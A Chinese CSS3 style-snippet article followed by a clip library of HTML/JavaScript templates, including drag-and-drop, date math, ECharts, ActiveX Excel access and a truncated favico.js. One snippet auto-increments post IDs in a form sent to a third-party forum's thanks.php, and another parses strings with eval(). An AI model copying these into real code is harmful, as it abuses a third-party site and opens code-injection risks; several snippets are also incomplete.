本篇文章将列出一些基础简单的CSS3样式，你可以把它们放在手边，需要用的时候随时拿过来修改成自己的风格就可以使用。为了使我们得CSS3样式可以重复使用，我把它们写成一个个class，天屹收集并把它们分类如link,input,text等等。
文中很多地方用到了rgba()给color赋值，rgba中前三个值是正常的rgb值，最后一个是透明度alpha值。
点击这里查看一个不错的css3手册！下面开始我们的正题。
1.定向盒阴影
TopRightBottomLeft
.drop-shadow.top {
  box-shadow: 0 -4px 2px -2px rgba(0,0,0,0.4);
}
.drop-shadow.right {
  box-shadow: 4px 0 2px -2px rgba(0,0,0,0.4);
}
.drop-shadow.bottom {
  box-shadow: 0 4px 2px -2px rgba(0,0,0,0.4);
}
.drop-shadow.left {
  box-shadow: -4px 0 2px -2px rgba(0,0,0,0.4);
}
2.强调盒阴影，很不错的效果
DarkLightInsetBorder
.emphasize-dark {
  box-shadow: 0 0 5px 2px rgba(0,0,0,.35);
}
.emphasize-light {
  box-shadow: 0 0 0 10px rgba(255,255,255,.25);
}
.emphasize-inset {
  box-shadow: inset 0 0 7px 4px rgba(255,255,255,.5);
}
.emphasize-border {
  box-shadow: inset 0 0 0 7px rgba(255,255,255,.5);
}
3.浮雕效果的盒阴影
LightHeavy
.embossed-light {
  border: 1px solid rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.7);
}
.embossed-heavy {
  border: 1px solid rgba(0,0,0,0.1);
  box-shadow:
    inset 0 2px 3px rgba(255,255,255,0.3),
    inset 0 -2px 3px rgba(0,0,0,0.3),
    0 1px 1px rgba(255,255,255,0.9);
}
4.CSS3渐变效果
Light LinearDark LinearLight RadialDark Radial
.gradient-light-linear {
  background-image: linear-gradient(rgba(255,255,255,.5), rgba(255,255,255,0));
}
.gradient-dark-linear {
  background-image: linear-gradient(rgba(0,0,0,.25), rgba(0,0,0,0));
}
.gradient-light-radial {
  background-image: radial-gradient(center 0, circle farthest-corner, rgba(255,255,255,0.4), rgba(255,255,255,0));
}
.gradient-dark-radial {
  background-image: radial-gradient(center 0, circle farthest-corner, rgba(0,0,0,0.15), rgba(0,0,0,0));
}
5.圆角
LightHeavyFullBarrel
.light-rounded {
  border-radius: 3px;
}
.heavy-rounded {
  border-radius: 8px;
}
.full-rounded {
  border-radius: 50%;
}
.barrel-rounded {
    border-radius: 20px/60px;
}
6.内嵌背景的超链接
This is some dummy text to show an 内嵌背景链接.
.inline-link-1 {
  display: inline-block;
  margin: 0 0.2em;
  padding: 3px;
  background: #97CAF2;
  border-radius: 2px;
  transition: all 0.3s ease-out;
  /* Font styles */
  text-decoration: none;
  font-weight: bold;
  color: white;
}
.inline-link-1:hover   { background: #53A7EA; }
.inline-link-1:active  { background: #C4E1F8; }
.inline-link-1:visited { background: #F2BF97; }
7.带下划线超链接
This is some dummy text to show an 下划线链接.
.inline-link-2 {
  display: inline-block;
  border-bottom: 1px dashed rgba(0,0,0,0.4);
  /* Font styles */
  text-decoration: none;
  color: #777;
}
.inline-link-2:hover   { border-bottom-style: dotted; }
.inline-link-2:active  { border-bottom-style: solid; }
.inline-link-2:visited { border-bottom: 1px solid #97CAF2; }
8.带三角指示器的超链接
This is some dummy text to show an 三角指示器链接.
.inline-link-3 {
    display: inline-block;
    position: relative;
    padding-left: 6px;
    /* Font styles */
    text-decoration: none;
    color: #6AB3EC;
    text-shadow: 0 1px 1px rgba(255,255,255,0.9);
}
.inline-link-3:hover {
    color: #3C9CE7;
}
.inline-link-3:before {
    content: "\25BA";
    font-size: 80%;
    display: inline-block;
    padding-right: 3px;
    pointer-events: none;
}
.inline-link-3:hover:before {
    color: #F2BF97;
}
						
					
9.阴影样式的超链接
阴影链接
阴影链接
.metro {
  display: inline-block;
  padding: 10px;
  margin: 10px;
  background: #08C;
  /* Font styles */
  color: white;
  font-weight: bold;
  text-decoration: none;
}
.metro:hover { background: #0AF; }
.metro.three-d {
  position: relative;
  box-shadow:
    1px 1px #53A7EA,
    2px 2px #53A7EA,
    3px 3px #53A7EA;
  transition: all 0.1s ease-in;
}
.metro.three-d:active {
  box-shadow: none;
  top: 3px;
  left: 3px;
}
10.带边框的超链接
边框链接
.bordered-link {
  display: inline-block;
  padding: 8px;
  border: 3px solid #FCB326;
  border-radius: 6px;
  box-shadow:
    0 2px 1px rgba(0, 0, 0, 0.2),
    inset 0 2px 1px rgba(0, 0, 0, 0.2);
  /* Font styles */
  text-decoration: none;
  font-size: 14px;
  text-transform: uppercase;
  color: #222;
}
.bordered-link:hover  { border-color: #FDD68B; }
.bordered-link:active { border-color: #FEE8BD; }
11.一些按钮样式
按钮
内嵌按钮
底座效果按钮
.modern {
  display: inline-block;
  margin: 10px;
  padding: 8px 15px;
  background: #B8ED01;
  border: 1px solid rgba(0,0,0,0.15);
  border-radius: 4px;
  transition: all 0.3s ease-out;
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,0.5),
    0 2px 2px rgba(0,0,0,0.3),
    0 0 4px 1px rgba(0,0,0,0.2);
  /* Font styles */
  text-decoration: none;
  text-shadow: 0 1px rgba(255,255,255,0.7);
}
.modern:hover  { background: #C7FE0A; }
.embossed-link {
  box-shadow:
    inset 0 3px 2px rgba(255,255,255,.22),
    inset 0 -3px 2px rgba(0,0,0,.17),
    inset 0 20px 10px rgba(255,255,255,.12),
    0 0 4px 1px rgba(0,0,0,.1),
    0 3px 2px rgba(0,0,0,.2);
}
.modern.embossed-link {
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,0.5),
    0 2px 2px rgba(0,0,0,0.3),
    0 0 4px 1px rgba(0,0,0,0.2),
    inset 0 3px 2px rgba(255,255,255,.22),
    inset 0 -3px 2px rgba(0,0,0,.15),
    inset 0 20px 10px rgba(255,255,255,.12),
    0 0 4px 1px rgba(0,0,0,.1),
    0 3px 2px rgba(0,0,0,.2);
}
.modern.embossed-link:active {
  box-shadow:
    inset 0 -2px 1px rgba(255,255,255,0.2),
    inset 0 3px 2px rgba(0,0,0,0.12);
}
.socle {
  position: relative;
  z-index: 2;
}
.socle:after {
  content: "";
  z-index: -1;
  position: absolute;
  border-radius: 6px;
  box-shadow:
	inset 0 1px 0 rgba(0,0,0,0.1),
	inset 0 -1px 0 rgba(255,255,255,0.7);
  top: -6px; bottom: -6px;
  right: -6px; left: -6px;
  background: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0));
}
12.简单的输入框样式
.simple-input {
  display: block;
  padding: 5px;
  border: 4px solid #F1B720;
  border-radius: 5px;
  color: #333;
  transition: all 0.3s ease-out;
}
.simple-input:hover { border-radius: 8px; }
.simple-input:focus {
  outline: none;
  border-radius: 8px;
  border-color: #EBD292;
}
13.Mac样式的输入框
.mac {
  display: block;
  border: none;
  border-radius: 20px;
  padding: 5px 8px;
  color: #333;
  box-shadow:
    inset 0 2px 0 rgba(0,0,0,.2),
    0 0 4px rgba(0,0,0,0.1);
}
.mac:focus {
  outline: none;
  box-shadow:
    inset 0 2px 0 rgba(0,0,0,.2),
    0 0 4px rgba(0,0,0,0.1),
    0 0 5px 1px #51CBEE;
}
14.带有深度和渐变效果的输入框
.depth {
  display: block;
  border: 1px solid silver;
  background: linear-gradient(#eee, #fff);
  transition: all 0.3s ease-out;
  padding: 5px;
  color: #555;
}
.depth:focus {
  outline: none;
  background-position: 0 -1.7em;
}
15.只有一条线的输入框
.line {
  display: block;
  border: none;
  color: #333;
  background: transparent;
  border-bottom: 1px dotted black;
  padding: 5px 2px 0 2px;
}
.line:focus {
  outline: none;
  border-color: #51CBEE;
}
#T=css3 多列 非IE
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<style type="text/css" mce_bogus="1">#div1{
-moz-column-count:2;
-webkit-column-count:2;
}
#T=Cursor input Position
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
	<script type="text/javascript">
	<!--
		function GetTextBoxCursorPosition(inputText) {
			var cursorPosition = 0;
			// IE
			if(document.selection) {
				inputText.focus();
				var textRange = document.selection.createRange();
				textRange.moveStart('character', - inputText.value.length);
				cursorPosition = textRange.text.length;
			}
			// Firefox
			else if(inputText.selectionStart || inputText.selectionStart == '0') {
				cursorPosition = inputText.selectionStart;
			}
			return cursorPosition;
		}
		function SetInputTextCursorPosition(inputText, cursorPosition) {
			// IE
			if(document.selection) { 
				inputText.focus();
				var textRange = document.selection.createRange();
				textRange.moveStart('character', - inputText.value.length);
				textRange.moveStart('character', cursorPosition);
				textRange.moveEnd('character', 0);
				textRange.select();
			}
			else if(inputText.selectionStart || inputText.selectionStart == '0') {
				inputText.selectionStart = cursorPosition;
				inputText.selectionEnd = cursorPosition;
				inputText.focus();
			}
		}
	//-->
	</script>
</head>
<body>
	<table border="1">
		<tr>
			<td colspan="2" align="center">
				<input type="text" id="text1" value="!@#123QWEasd" />
			</td>
		</tr>
		<tr>
			<td>
				<input type="button" id="button1" value="Set Cursor Position" onclick="SetInputTextCursorPosition(document.getElementById('text1'), parseInt(document.getElementById('text2').value));" />
			</td>
			<td>
				<input type="text" id="text2" />
			</td>
		</tr>
	</table>
	<script type="text/javascript">
	<!--
		var x = document.getElementById("text1");
		x.onkeydown = x.onclick = x.onselect = onCursorPositionChange;
		function onCursorPositionChange()
		{
			var sender = window.event.srcElement;
			if (sender.type == "text")
			{
				document.getElementById("text2").value = GetTextBoxCursorPosition(sender);
			}
		}
	//-->
	</script>
</body>
</html>

#T=date
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft">
	<meta name="Author" content="EditPlus?,Microshaoft">
	<meta name="Keywords" content="EditPlus?,Microshaoft">
	<meta name="Description" content="EditPlus?,Microshaoft">
	<title>Document</title>
</head>
<body>
<script type="text/javascript">
<!--
	var date = new Date();
	date.getYear();							//获取当前年份(2位)
	date.getFullYear();						//获取完整的年份(4位,1970-????)
	date.getMonth();						//获取当前月份(0-11,0代表1月)
	date.getDate();							//获取当前日(1-31)
	date.getDay();							//获取当前星期X(0-6,0代表星期天)
	date.getTime();							//获取当前时间(从1970.1.1开始的毫秒数)
	date.getHours();						//获取当前小时数(0-23)
	date.getMinutes();						//获取当前分钟数(0-59)
	date.getSeconds();						//获取当前秒数(0-59)
	date.getMilliseconds();					//获取当前毫秒数(0-999)
	date.toLocaleDateString();				//获取当前日期
	var time = date.toLocaleTimeString();	//获取当前时间
	date.toLocaleString( );					//获取日期与时间 
	var date1 = new Date();					//"2013-11-29");
	var date2 = new Date();					//"2013-11-29");
	console.log(date1 == date2);			//false
	console.log(date1.getTime() == date2.getTime());	//true
	console.log(date1 - date2 == 0); //true
//-->
</script>
</body>
</html>

#T=date in js
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset=utf-8>
<title>Date-Year</title>
</head> 
<style>   
</style>     
<body>
    <div id="timer"></div>
    <script>
    //一天中有这些毫秒
    var msPerDay = 86400000;
    //给一个毫秒数，看它是多少天
    function Day(t){
      return Math.floor(t/msPerDay);
    }
    console.log('946684800000毫秒是（）天：'+Day(946684800000));
    function TimeWithInDay(t){
      return t%msPerDay;
    }
    console.log('946684800001毫秒多少天后余（）秒：'+TimeWithInDay(946684800001));
    //年份无非就分为闰年和不是闰年，闰年366天，不是闰年365天。
   // 而闰年的特征就是，能被4整除且不能被100整除或者能被400整除。
    function DaysInYear(y){
        if(y%4 !== 0){
          return 365;//不能被4整除，则365天
        }else if(y%100 !== 0){
          return 366;//能被4整除且不能被100整除，则366天，闰年
        }else if(y%400 !== 0){
           return 365;//不能被400整除，则365天
        }else{
           return 366;//能被400整除，则366天，闰年
        }
      }
    console.log('2000年一共有（）天：'+DaysInYear(2000));
    //从1970年开始到y年，一共经过了多少天（我还没有确切的明白这里为什么要这样做）
     function DayFromYear(y) {
          return 365 * (y - 1970) +
            Math.floor((y - 1969) / 4) -
            Math.floor((y - 1901) / 100) +
            Math.floor((y - 1601) / 400);
        }
     console.log('从1970到2000年经过了（）天：'+DayFromYear(2000));
     //从1970年开始到y年，一共经过了多少毫秒
      function TimeFromYear(y){
         return msPerDay * DayFromYear(y);
      }
      console.log('从1970年到2000年经过了（）毫秒：'+TimeFromYear(2000))
      //给一个时间t这是从1970年开始经过了多少年
      function YearFromTime(t){
         var y = 1970;
         //TimeFromYear(y),逐渐获得从1970年开始一年内的毫秒数，两年内的毫秒数....(可以看t落在哪个范围内了)
         //大神说这个不是完全的准确
         while(t>TimeFromYear(y)){
          y++;
         }
         return y;
      }
       console.log('946684800000毫秒是从1970年到（）年经过的：'+YearFromTime(946684800000));
       console.log('1412846287654毫秒是从1970年到（）年经过的：'+YearFromTime(1412846287654));
      //给一个毫秒数，看他从1970年经过了..年，现在是几几年，这个年份是不是闰年
      function InLeapYear(t){
        return (DaysInYear(YearFromTime(t))===366)?true:false;
      }
       console.log('从1970年经过946684800000毫秒后的这一年是不是闰年：'+InLeapYear(946684800000)); 
    </script>
</body>  
</html>
#T=dragdrop 拖拽
<!DOCTYPE HTML>
<html>
<head>
	<title>dragdrop_0.5.html</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<style type="text/css">
		body {margin:0;padding:0;}
	</style>
	<script type="text/javascript">
	<!--
		/**
		 * JavaScript Dragdrop Library v0.6
		 * Copyright (c) 2010 snandy
		 * Blog: http://snandy.javaeye.com/
		 * QQ群: 34580561
		 * Date: 2010-09-06
		 * 
		 * 
		 * 基本拖拽
		 * new Dragdrop({
		 *		target	 拖拽元素 HTMLElemnt 必选
		 *		bridge	 指定鼠标按下哪个元素时开始拖拽，实现模态对话框时用到
		 *		dragable 是否可拖拽	(true)默认
		 *		dragX	 true/false false水平方向不可拖拽 (true)默认
		 *		dragY	 true/false false垂直方向不可拖拽 (true)默认
		 *		area	 [minX,maxX,minY,maxY] 指定拖拽范围 默认任意拖动
		 *		callback 移动过程中的回调函数
		 * });
		 * 
		 * demo
		 *		dragdrop_0.6.html
		 */

		Dragdrop = function(window){
			var doc = window.document;
			var E = {
				on : function(el, type, fn){
					el.addEventListener ?
						el.addEventListener(type, fn, false) :
					el.attachEvent ?
						el.attachEvent("on" + type, fn) :
					el['on'+type] = fn;
				},
				un : function(el,type,fn){
					el.removeEventListener ?
						el.removeEventListener(type, fn, false) :
					el.detachEvent ?
						el.detachEvent("on" + type, fn) :
					el['on'+type] = null;
				},
				evt : function(e){
					return e || window.event;
				}
			};
			return function(opt){
				
				var conf = null, defaultConf, diffX, diffY;
				function Config(opt){
					this.target = opt.target;
					this.bridge = opt.bridge;
					this.dragable = opt.dragable != false;
					this.dragX = opt.dragX != false;
					this.dragY = opt.dragY != false;
					this.area  = opt.area;
					this.callback = opt.callback;
				}	
				function Dragdrop(opt){
					if(!opt){return;}
					conf = new Config(opt);
					defaultConf = new Config(opt);
					conf.bridge ?
						E.on(conf.bridge,'mousedown',mousedown) :
						E.on(conf.target,'mousedown',mousedown);
				}
				Dragdrop.prototype = {
					dragX : function(){
						conf.dragX = true;
						conf.dragY = false;
					},
					dragY : function(b){
						conf.dragY = true;
						conf.dragX = false;
					},
					dragAll : function(){
						conf.dragX = true;
						conf.dragY = true;
					},
					setArea : function(a){
						conf.area = a;
					},
					setBridge : function(b){
						conf.bridge = b;
					},
					setDragable : function(b){
						conf.dragable = b;
					},
					reStore : function(){
						conf = new Config(defaultConf);
						conf.target.style.top = '0px';
						conf.target.style.left = '0px';
					},
					getDragX : function(){
						return conf.dragX;
					},
					getDragY : function(){
						return conf.dragY;
					}
				}
				function mousedown(e){
					e = E.evt(e);
					var el = conf.target;
					el.style.position = 'absolute';
					el.style.cursor = 'move';
					if(el.setCapture){ //IE
						E.on(el, "losecapture", mouseup);
						el.setCapture();
						e.cancelBubble = true;
					}else if(window.captureEvents){ //标准DOM
						e.stopPropagation();
						E.on(window, "blur", mouseup);
						e.preventDefault();
					}
					diffX = e.clientX - el.offsetLeft;
					diffY = e.clientY - el.offsetTop;
					E.on(doc,'mousemove',mousemove);
					E.on(doc,'mouseup',mouseup);
				}
				function mousemove(e){
					var el = conf.target, e = E.evt(e), moveX = e.clientX - diffX, moveY = e.clientY - diffY;
					var minX, maxX, minY, maxY;
					if(conf.area){
						minX = conf.area[0];
						maxX = conf.area[1];
						minY = conf.area[2];
						maxY = conf.area[3];
						moveX < minX && (moveX = minX); // left 最小值
						moveX > maxX && (moveX = maxX); // left 最大值
						moveY < minY && (moveY = minY); // top 最小值
						moveY > maxY && (moveY = maxY); // top 最大值
					}
					if(conf.dragable){
						conf.dragX && (el.style.left = moveX + 'px');
						conf.dragY && (el.style.top =  moveY + 'px');
						if(conf.callback){
							var obj = {moveX:moveX,moveY:moveY};
							conf.callback.call(conf,obj);
						}
					}
				}
				function mouseup(e){
					var el = conf.target;
					el.style.cursor = 'default';
					E.un(doc,'mousemove',mousemove);
					E.un(doc,'mouseup',mouseup);
					if(el.releaseCapture){ //IE
						E.un(el, "losecapture", mouseup);
						el.releaseCapture();
					}
					if(window.releaseEvents){ //标准DOM
						E.un(window, "blur", mouseup);
					}
				}
				return new Dragdrop(opt);
				
			}
				
		}(this);
	//-->
	</script>
	<script type="text/javascript">
		window.onload = function(){
			var container = document.getElementById('container');
			var ele = document.getElementById('d1');
			var bodyWidth = container.offsetWidth,
				bodyHeight = container.offsetHeight;
			var maxX = bodyWidth - ele.offsetWidth - 10;
			var maxY = bodyHeight - ele.offsetHeight - 10;
			var dd = new Dragdrop({
				target : ele,
				area : [0,maxX,0,maxY],
				callback : function(obj){
					if(typeof obj.moveX == 'number' && this.dragX){
						document.getElementById('x').innerHTML = 'x:'+obj.moveX;
					}
					if(typeof obj.moveY == 'number' && this.dragY){
						document.getElementById('y').innerHTML = 'y:'+obj.moveY;	
					}
				}
			});	
			document.getElementById('setting').onclick = function(e){
				e = e || event;
				var target = e.target || e.srcElement;
				if(target.value == '1' && target.checked){
					dd.dragAll();
				}
				if(target.value == '2' && target.checked){
					dd.dragX();
				}
				if(target.value == '3' && target.checked){
					dd.dragY();
				}
				if(target.value == '4' && target.checked){
					dd.setDragable(false);
				}
				if(target.value == '5' && target.checked){
					dd.setDragable(true);
				}
				if(target.value == '6' && target.checked){
					dd.reStore();
					document.getElementById('x').innerHTML = 'x:0';
					document.getElementById('y').innerHTML = 'y:0';
				}
			}
		}
	</script>
</head>
<body>
	<div style="width:600px;height:20px;margin:10px auto;">
		拖拽状态：<span id="x">x:0</span>, <span id="y">y:0</span>
	</div>
	
	<div id="container" style="position:relative;border:5px solid gray;width:600px;height:300px;margin:0 auto;">
		<div id="d1" style="width:100px;height:50px;background:gold;text-align:center;position:absolute;left:0px;top:0px;">
			Drag me.
		</div>			
	</div>
	<div id="setting" style="width:600px;margin:20px auto;">
		<input id="f1" type="radio" value="1" name="flag"/><label for="f1">任意方向</label>
		<input id="f2" type="radio" value="2" name="flag"/><label for="f2">水平方向</label>
		<input id="f3" type="radio" value="3" name="flag"/><label for="f3">垂直方向</label>
		<input id="f4" type="radio" value="4" name="flag"/><label for="f4">停止拖拽</label>
		<input id="f5" type="radio" value="5" name="flag"/><label for="f5">开启拖拽</label>
		<input id="f6" type="radio" value="6" name="flag"/><label for="f6">恢复初始状态</label>
	</div>
</body>
</html>

#T=eChart 折线
<!DOCTYPE html>
<head>
	<meta charset="utf-8">
	<title>ECharts</title>
	<!-- 来自百度CDN -->
	<script src="http://s1.bdstatic.com/r/www/cache/ecom/esl/1-6-10/esl.js"></script>
	<script type="text/javascript">
		var myChart = null;
		// 路径配置
		require.config({
			paths:{ 
				'echarts' : 'http://echarts.baidu.com/build/echarts',
				'echarts/chart/bar' : 'http://echarts.baidu.com/build/echarts'
			}
		});
		// 使用
		require(
			[
				'echarts',
				'echarts/chart/bar' // 使用柱状图就加载bar模块，按需加载
			],
			function (ec) {
				// 基于准备好的dom，初始化echarts图表
				myChart = ec.init(document.getElementById('main')); 

				var option = {
					title : {
						text: '未来一周气温变化',
						subtext: '纯属虚构'
					},
					tooltip : {
						trigger: 'axis'
					},
					legend: {
						data:['最高气温','最低气温']
					},
					toolbox: {
						show : true,
						feature : {
							mark : {show: true},
							dataView : {show: true, readOnly: false},
							magicType : {show: true, type: ['line', 'bar']},
							restore : {show: true},
							saveAsImage : {show: true}
						}
					},
					calculable : true,
					xAxis : [
						{
							type : 'category',
							boundaryGap : false,
							data : ['周一','周二','周三','周四','周五','周六','周日']
						}
					],
					yAxis : [
						{
							type : 'value',
							axisLabel : {
								formatter: '{value} °C'
							}
						}
					],
					series : [
						{
							name:'最高气温',
							type:'line',
							data:[11, 11, 15, 13, 12, 13, 10],
							markPoint : {
								data : [
									{type : 'max', name: '最大值'},
									{type : 'min', name: '最小值'}
								]
							},
							markLine : {
								data : [
									{type : 'average', name: '平均值'}
								]
							}
						},
						{
							name:'最低气温',
							type:'line',
							data:[1, -2, 2, 5, 3, 2, 0],
							markPoint : {
								data : [
									{name : '周最低', value : -2, xAxis: 1, yAxis: -1.5}
								]
							},
							markLine : {
								data : [
									{type : 'average', name : '平均值'}
								]
							}
						}
					]
				};
				// 为echarts对象加载数据
				myChart.setOption(option);
			}
		);
		
		function Push()
		{
			var option = myChart.getOption();
			option.xAxis[0].data.push('周八');
			option.series[0].data.push(100);
			myChart.hideLoading();
			myChart.setOption(option);
		}
	</script>
</head>
<body>
	<div id="test" style="height:400px">
		<input type="button" value="push" onclick="Push()" />
	</div>
	<!-- 为ECharts准备一个具备大小（宽高）的Dom -->
	<div id="main" style="height:400px"></div>
</body>

#T=et8.org thanks
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<meta name="author" content="" />
	<meta name="keywords" content="" />
	<meta name="description" content="" />
</head>

<body>
<form method="post" action="http://et8.org/thanks.php" target="new">
	<input type="text" name="id" id="postid" />
	<input type="submit" onclick="Process()" />
</form>
<script type="text/javascript" language="javascript">
	var postID = 17000
	document.getElementById('postid').value = postID;
	function Process()
	{
		var i = parseInt(document.getElementById('postid').value);
		//alert(i);
		document.getElementById('postid').value = ++i;
	}
</script>
</body>
</html>

#T=eval json
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
<script type="text/javascript">
<!--
	"use strict";
	var func = function(scriptCode) {
					var code = "(" + scriptCode + ");";
					return eval(code);
				};
	var json, r;
	json = '{ F1 : "a" , "F2\" : "b\" , \'F3\' : \"c" }';
	r = func(json);
	alert (
			r.F1
			+ "\t"
			+ r.F2
			+ "\t"
			+ r.F3
		);

	json = "{ F1 : \"a\" , \"F2\" : 'b', 'F3' : 'c' }";
	r = func(json);
	alert (
			r.F1
			+ "\t"
			+ r.F2
			+ "\t"
			+ r.F3
		);
//-->
</script>
</body>
</html>

#T=excel js
<html>
     <head><title>456</title></head>
     <body>
         <div>
             <input type="file" name="fileChose" id="file"/>
             <input type="button" value="打开" onclick="testX()"/>
             <input type="button" value="创建表格" onclick="create()"/>
         </div>
         
 <script type="text/javascript">
     
     var names = new Array('userName','userPwd','email','mobile','address');
     var vls1 = new Array();      
     var currentCell=0;
     var ids = new Array();
     //创建表单
     function create()
     {
         
         var html="<table>";
         for(var i=0;i<names.length;i++)
         {
             html+="<tr><td>"+names[i]+"</td><td><input type='txt' id='id"+i+"'/></td></tr>";
             ids[i]="id"+i;
         }
         html+="</table><div><input  type='submit' value='下一条' onclick='nextData()'/>";
         html+="<input  type='button' value='保存' onclick='createExcel()'/></div>";
         var newRow = document.getElementById("rs2");
         newRow.innerHTML="填写表单:<p>"+html;
     }
     //下一条
     function nextData()
     {
        var vl = new Array();
       for(var i=0;i<ids.length;i++)
       {
           var pt = document.getElementById(ids[i]);
           vl[i]= pt.value;
       //    pt.value="";
           
       }
       vls1[currentCell++]=vl;
       document.getElementById(ids[0]).value="";
       document.getElementById(ids[1]).value="";
           document.getElementById(ids[0]).focus();
     }
     
     //建表
     function createExcel()
   {
       
     try{
         
         var xls = new ActiveXObject("Excel.Application"); 
             xls.visible = false; 
             //var newBook = xls.Workbooks.Add; 
             var file=document.getElementById("file");
         var filePath=file.value;
             var newBook = xls.Workbooks.open(filePath);
             var sheet =newBook.Worksheets(1);
         //    newBook.Worksheets.Add; 
             sheet.Activate; 
             xls.ActiveWorkBook.ActiveSheet.PageSetup.Orientation = 2; 
             xls.ActiveWorkBook.ActiveSheet.PageSetup.PaperSize = 5; 
             //sheet.Columns("A").columnwidth=50; 
             sheet.Columns("A").WrapText = true; 
         //    sheet.Columns("B").columnwidth=50; 
             sheet.Columns("B").WrapText = true; 
             //sheet.Range("A1:B1000").NumberFormat = "0"; 
             //sheet.Range("A1:B1000").HorizontalAlignment = -4131; 
             for(var i=1;i<=names.length;i++)
             {
                 sheet.Cells(1,i).Interior.ColorIndex="15";
                 sheet.Cells(1,i).value=names[i-1];
             }
             var columscount = sheet.Columns.count;
             var startColum=0;
             //找到追加的起始行
             for(var k=1;k<columscount;k++)
           {
                     startColum++;
                     if(!sheet.Cells(k,1).value)
                     {
                        break;       
                     }
            }
           for(var i=1;i<=vls1.length;i++)
           {
               var values = vls1[i-1];
               for(var j=1;j<=values.length;j++)
               {
                   sheet.Cells(startColum,j).value=values[j-1];
               }
               startColum++;
           }
             currentCell=0;//保存后清零
             //sheet.Close(savechanges=true);
             //newBook.Close(savechanges=true);
             try
             {
                 sheet.Application.Quit();
           //xls.Quit();
           newBook=null;
           xls = null;
             }catch(e){}
         //alert("保存成功");   
         //ExcelSheet.SaveAs("C:\\TEST.XLS");
             //sheet.Name="体检表"
             
     }catch(e)
     {
         alert(e.message);
         return;
     }
   }
     //读取表格
     function testX()
     {
          var xls=null;
      var newBook = null;
      var file=document.getElementById("file");
      var filePath=file.value;
          try{
              xls = new ActiveXObject("Excel.Application");
              xls.DisplayAlerts = false;
              if(xls!=null)
              {
                  newBook = xls.Workbooks.Open(filePath);   
                  var  mySheet=newBook.ActiveSheet;
                     var cs = mySheet.Columns.count;
                     var rs = mySheet.Rows.count; 
                         cs=cs>20?20:cs;
                         rs=rs>50?50:rs;
                     var tb = getSheet(rs,cs,mySheet);
                     var newRow = document.getElementById("rs");
                       newRow.innerHTML="以下是表格数据:"+tb; 
                       mySheet.Application.Quit();
                       //xls.Quit();
                       //newBook.Close();
                       mySheet=null;
                     newBook=null;
                     xls = null;     
                    // alert("表单关闭");
              }
             }catch(e){
             alert(e.message);
         } 
         
     }
     //遍历一个sheet
     function getSheet(rows,colums,oSheet)
     {
         var str="<table border='1'><tr>";
         try{
         for(var i=1;i<rows;i++){
             
             for(var j=1;j<colums;j++)
             {
               var vl = oSheet.Cells(i,j);
               if(!vl.value)
               {
                   vl="\t";
               }
                 str+="<td>"+vl+"</td>";
             }
             str+="<tr>";
         }
     }catch(e){
         alert(e.message);
     }
     str+="</tr><table>";
     return str;
     }
     
 </script>
 <div id="fm"></div>
 <div id="rs"></div>
 <div id="rs2"></div>
 </body>
 </html>
#T=favico.js
/**
 * @license MIT
 * @fileOverview Favico animations
 * @author Miroslav Magda, http://blog.ejci.net
 * @version 0.3.0
 */

/**
 * Create new favico instance
 * @param {Object} Options
 * @return {Object} Favico object
 * @example
 * var favico = new Favico({
 *    bgColor : '#d00',
 *    textColor : '#fff',
 *    type : 'circle',
 *    animation : 'slide',
 * });
 */
(function() {

    var Favico = (function(opt) {'use strict';
        opt = (opt) ? opt : {};
        var _def = {
            bgColor : '#d00',
            textColor : '#fff',
            fontFamily : 'sans-serif', //Arial,Verdana,Times New Roman,serif,sans-serif,...
            fontStyle : 'bold', //normal,italic,oblique,bold,bolder,lighter,100,200,300,400,500,600,700,800,900
            type : 'circle',
            position : 'down', // down, up
            animation : 'slide',
            elementId : false
        };
        var _opt, _orig, _h, _w, _canvas, _context, _img, _ready, _lastBadge, _running, _readyCb, _stop, _browser;

        _browser = {};
        _browser.ff = (/firefox/i.test(navigator.userAgent.toLowerCase()));
        _browser.chrome = (/chrome/i.test(navigator.userAgent.toLowerCase()));
        _browser.opera = (/opera/i.test(navigator.userAgent.toLowerCase()));
        _browser.ie = (/msie/i.test(navigator.userAgent.toLowerCase())) || (/trident/i.test(navigator.userAgent.toLowerCase()));
        _browser.supported = (_browser.chrome || _browser.ff || _browser.opera);

        var _queue = [];
        _readyCb = function() {
        };
        _ready = _stop = false;
        /**
         * Initialize favico
         */
        var init = function() {
            //merge initial options
            _opt = merge(_def, opt);
            _opt.bgColor = hexToRgb(_opt.bgColor);
            _opt.textColor = hexToRgb(_opt.textColor);
            _opt.position = _opt.position.toLowerCase();
            _opt.animation = (animation.types['' + _opt.animation]) ? _opt.animation : _def.animation;
            //transform animation
